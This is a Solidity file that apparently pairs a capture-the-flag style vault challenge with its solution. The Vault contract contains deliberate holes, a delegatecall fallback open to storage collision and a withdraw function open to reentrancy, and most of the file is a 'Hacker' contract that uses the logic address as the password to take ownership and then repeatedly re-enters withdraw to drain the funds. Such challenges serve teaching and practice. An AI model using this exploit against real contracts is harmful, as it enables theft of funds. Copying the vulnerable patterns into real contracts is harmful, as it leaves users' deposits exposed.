// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "../lib/forge-std/src/console.sol";

contract VaultLogic {

  address public owner;
  bytes32 private password;

  constructor(bytes32 _password) public {
    owner = msg.sender;
    password = _password;
  }

  function changeOwner(bytes32 _password, address newOwner) public {
    if (password == _password) {
        owner = newOwner;
    } else {
      revert("password error");
    }
  }
}

contract Vault {

  address public owner;
  VaultLogic logic;
  mapping (address => uint) deposites;
  bool public canWithdraw = false;

  constructor(address _logicAddress) public {
    logic = VaultLogic(_logicAddress);
    owner = msg.sender;
  }


  fallback() external {
    (bool result,) = address(logic).delegatecall(msg.data);
    if (result) {
      this;
    }
  }

  receive() external payable {

  }

  function deposite() public payable { 
    deposites[msg.sender] += msg.value;
  }

  function isSolve() external view returns (bool){
    if (address(this).balance == 0) {
      return true;
    } 
  }

  function openWithdraw() external {
    if (owner == msg.sender) {
      canWithdraw = true;
    } else {
      revert("not owner");
    }
  }

  function withdraw() public {

    if(canWithdraw && deposites[msg.sender] >= 0) {
      (bool result,) = msg.sender.call{value: deposites[msg.sender]}("");
      if(result) {
        deposites[msg.sender] = 0;
      }
      
    }

  }

}

contract Hacker{

  address public player;
  address payable public vaultAddress;
  address public logicAddress;

  constructor(address _vaultAddress,address _logicAddress) {
    player = msg.sender;
    vaultAddress = payable(_vaultAddress);
    logicAddress = _logicAddress;
  }

  function doHack() public payable {
    //deposit
    Vault(vaultAddress).deposite{value: 0.01 ether}();

    vaultAddress.call(
      abi.encodeWithSignature("changeOwner(bytes32,address)",logicAddress,address (this))
    );
    //withdraw
    Vault(vaultAddress).openWithdraw();
    Vault(vaultAddress).withdraw();

    payable(msg.sender).transfer(address (this).balance);
  }

  fallback() payable external{
    if(vaultAddress.balance < 0.01 ether){
      return;
    }
    Vault(vaultAddress).withdraw();
  }



}